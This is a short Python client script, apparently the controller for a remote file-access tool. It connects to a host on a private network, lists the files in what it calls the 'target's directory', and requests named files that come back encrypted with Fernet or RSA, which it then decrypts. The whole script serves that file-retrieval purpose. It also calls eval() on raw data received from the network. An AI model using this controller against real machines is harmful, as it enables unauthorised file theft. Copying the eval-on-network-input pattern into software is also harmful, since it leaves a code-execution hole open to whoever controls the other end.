import socket
from cryptography.fernet import Fernet
import rsa

HOST = '192.168.240.225'
PORT = 2018
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print("These are the possible commands: STOP, ELENCO, Symmetric Cryptography e Asymmetric Cryptography")

while 1:
    messaggio = input("Write a message:")
    s.send(messaggio.encode())

    if (messaggio=="STOP"):
        break

# The command "ELENCO" returns a list of the file in the target's directory
    if (messaggio=="ELENCO"):
        messaggioRicevuto = s.recv(2048)
        files = eval(messaggioRicevuto)
        print("Files:")
        for i in files:
            print(i)

    if (messaggio == "Symmetric Cryptography"):
        nomefile = input('Write the filename:')
        s.send(nomefile.encode())
        key = s.recv(1024)
        encMsg = s.recv(1024)
        message = encMsg.decode()
        print("Encripted file: " + message)

        fernet = Fernet(key)

        decMsg = fernet.decrypt(encMsg)
        print("Decrypted message: ", decMsg.decode())

    if (messaggio == "Asymmetric Cryptography"):
        nomefile = input('Write the filename:')
        s.send(nomefile.encode())

        publicKey, privateKey = rsa.newkeys(512)
        s.send(publicKey.save_pkcs1())

        message = s.recv(1024)
        print("The encripted message is:", message)
        decr_message = rsa.decrypt(message, privateKey).decode()
        print("The decrypted message is:", decr_message)

s.close()
